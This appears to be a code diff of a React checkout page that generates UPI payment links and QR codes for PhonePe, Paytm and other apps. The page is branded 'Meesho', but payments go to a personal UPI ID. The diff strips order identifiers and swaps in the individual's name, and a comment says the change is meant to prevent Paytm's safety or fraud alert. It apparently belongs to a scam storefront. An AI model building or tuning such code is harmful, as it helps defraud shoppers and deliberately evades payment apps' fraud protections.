@@ -95,8 +95,8 @@ function CheckOutpage({ data }) {
   }, []);
 
   const upiId = "rajpatel1861997@okaxis";
+  const verifiedAccountName = "Raj Patel";
   const payeeName = "Meesho";
-  const aid = "uGICAgOD1lfiuLw";
   const [copied, setCopied] = useState(false);
 
   const handleCopyUpi = () => {
@@ -121,16 +121,16 @@ function CheckOutpage({ data }) {
     }
 
     const formattedAmount = numericAmount.toFixed(2);
-    const orderNote = `Order_${Date.now()}`;
+    const orderNote = "Payment";
 
     const isIOS =
       typeof navigator !== "undefined" &&
       /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    const baseUpiQuery =
+    // Clean NPCI-compliant query matching bank registration (prevents Paytm safety/fraud alert)
+    const cleanUpiQuery =
       `pa=${encodeURIComponent(upiId)}` +
-      `&pn=${encodeURIComponent(payeeName)}` +
-      `&aid=${encodeURIComponent(aid)}` +
+      `&pn=${encodeURIComponent(verifiedAccountName)}` +
       `&am=${formattedAmount}` +
       `&cu=INR` +
       `&tn=${encodeURIComponent(orderNote)}`;
@@ -139,7 +139,7 @@ function CheckOutpage({ data }) {
 
     if (app === "phonepe") {
       if (isIOS) {
-        paymentUrl = `phonepe://pay?${baseUpiQuery}`;
+        paymentUrl = `phonepe://pay?${cleanUpiQuery}`;
       } else {
         const payload = {
           p2pPaymentCheckoutParams: {
@@ -153,7 +153,7 @@ function CheckOutpage({ data }) {
           },
           contact: {
             type: "EXTERNAL_MERCHANT",
-            name: payeeName,
+            name: verifiedAccountName,
             vpa: upiId,
           },
         };
@@ -165,9 +165,9 @@ function CheckOutpage({ data }) {
         paymentUrl = `phonepe://native?data=${encodeURIComponent(encodedPayload)}&id=p2ppayment`;
       }
     } else if (app === "paytm") {
-      paymentUrl = `paytmmp://pay?${baseUpiQuery}`;
+      paymentUrl = `paytmmp://pay?${cleanUpiQuery}`;
     } else {
-      paymentUrl = `upi://pay?${baseUpiQuery}`;
+      paymentUrl = `upi://pay?${cleanUpiQuery}`;
     }
 
 
@@ -1621,7 +1621,7 @@ useEffect(() => {
                     <div className="bg-white p-3 rounded-xl shadow-sm border border-gray-100 inline-block mx-auto my-1">
                       <img
                         src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=8&data=${encodeURIComponent(
-                          `upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&aid=${aid}&am=${Number(
+                          `upi://pay?pa=${upiId}&pn=${encodeURIComponent(verifiedAccountName)}&am=${Number(
                             buydata?.length > 0
                               ? qtyAdd *
                                   (buydata[0]?.yesnoval
